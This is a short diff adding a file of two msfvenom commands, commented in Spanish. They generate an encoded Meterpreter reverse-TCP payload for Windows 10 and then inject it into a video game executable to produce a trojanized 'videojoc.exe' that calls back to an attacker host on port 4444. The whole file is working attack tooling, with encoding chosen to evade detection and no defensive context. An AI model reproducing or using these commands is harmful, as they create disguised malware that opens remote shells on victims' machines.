@@ -1,0 +1,5 @@
+# Generacion de Exploit Codificado (Windows 10)
+msfvenom -p windows/meterpreter/meterpreter_reverse_tcp -a x86 -platform Windows LHOST=10.10.0.1 LPORT=4444 -e x86/shikata_ga_nai -f exe > encoded_payload.exe
+
+# Generacion de Exploit Codificado Inyectado (Windows 10) [Inyectado en un Videojuego ".exe"] 
+msfvenom -p windows/meterpreter/meterpreter_reverse_tcp -a x86 -platform Windows LHOST=10.10.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 10 -k -x endless-onslaught.exe -f exe > videojoc.exe
